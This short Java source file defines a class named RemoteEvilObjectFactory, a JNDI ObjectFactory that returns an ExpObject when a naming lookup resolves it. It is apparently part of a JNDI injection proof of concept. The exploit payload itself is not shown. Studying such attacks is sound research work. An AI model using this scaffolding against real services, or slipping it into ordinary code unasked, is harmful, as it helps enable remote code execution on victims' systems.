package com.venscor.jdni;


import java.io.IOException;
import java.util.Hashtable;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

/**
 * @author wangyu07 <wangyu07@kuaishou.com>
 * Created on 2022-02-07
 */
@SuppressWarnings("unused")
public class RemoteEvilObjectFactory implements ObjectFactory {
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)
            throws IOException {
        return new ExpObject();

    }
}
